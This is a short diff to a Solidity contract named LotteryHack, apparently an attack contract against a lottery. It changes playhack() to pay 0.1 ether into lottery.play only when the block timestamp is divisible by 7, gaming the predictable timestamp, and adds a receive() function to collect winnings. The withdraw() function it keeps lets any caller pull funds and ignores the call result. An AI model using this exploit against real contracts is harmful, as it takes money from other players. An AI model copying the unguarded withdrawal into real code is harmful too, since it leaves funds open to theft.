@@ -16,8 +16,10 @@ contract LotteryHack{
     function withdraw(uint256 _amount) public {
         (bool success,) = payable(msg.sender).call{value: _amount}("");
     }   
-    function playhack() public{
+    function playhack() public returns (bool) {
         require(block.timestamp % 7 == 0);
-        lottery.play();
+        bool result = lottery.play{value: 0.1 ether}();
+        return result;
     }
+    receive() external payable {}
 }
